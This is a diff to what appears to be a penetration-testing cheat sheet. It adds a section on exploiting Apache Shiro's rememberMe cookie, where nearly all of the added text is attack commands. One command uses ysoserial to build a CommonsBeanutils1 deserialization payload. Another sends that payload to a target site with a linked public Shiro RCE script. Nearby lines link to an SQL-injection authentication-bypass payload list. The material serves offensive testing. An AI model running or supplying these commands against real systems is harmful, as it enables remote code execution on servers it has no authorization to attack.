@@ -462,7 +462,21 @@ https://xcat.readthedocs.io/en/latest/
 
 https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt
   
-## SQLI and XPATH
+## Padding Oracle Attack
+  
+### Identify
+
+-> rememberMe: (Cookie)
+
+### Exploiting 
+
+java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/success" > payload.class
+
+https://github.com/frohoff/ysoserial
+
+python shiro_exp.py site.com/home.jsp cookie payload.class
+
+https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
 
 ### Wordlist for SQL Injection - Bypass
 
